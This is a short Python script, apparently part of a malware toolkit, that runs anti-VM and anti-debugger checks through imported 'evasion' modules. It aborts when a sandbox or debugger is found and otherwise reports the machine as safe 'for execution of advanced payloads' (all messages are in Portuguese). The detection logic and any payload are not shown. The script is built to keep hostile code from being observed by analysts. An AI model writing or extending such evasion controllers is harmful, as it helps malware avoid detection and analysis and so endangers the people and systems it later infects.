import evasion.antivm as antivm
import evasion.antidebug as antidebug
import platform
import time

def run_evasion_scan():
    print("\n🛡️  [EvasionController] Execução Brutal de Verificações Iniciada\n")
    print(f"[📌] Plataforma: {platform.system()} {platform.version()}\n")

    print("[🎭] Análise Anti-VM:")
    vm_detected = antivm.check_virtual_environment()
    if vm_detected:
        print("  [⛔] Ambiente Virtual Detectado — Execução Interrompida por Segurança.")
    else:
        print("  [✅] Nenhum traço de VM identificado.")

    print("\n[🧠] Análise Anti-Debug:")
    debugger_detected = antidebug.check_debugger_processes()

    if debugger_detected:
        print("  [⛔] Depurador ou Hooking Suspeito Identificado — Evasão Ativada.")
    else:
        print("  [✅] Nenhum depurador identificado.")

    print("\n🚀 Finalizado: Evasão Executada com Precisão Técnica.\n")
    return not vm_detected and not debugger_detected

if __name__ == "__main__":
    success = run_evasion_scan()
    if not success:
        print("[⚠️] Ambiente inseguro. Abortando operações críticas...\n")
        time.sleep(3)
        exit(1)
    else:
        print("[🔓] Ambiente seguro para execução de payloads avançados.\n")
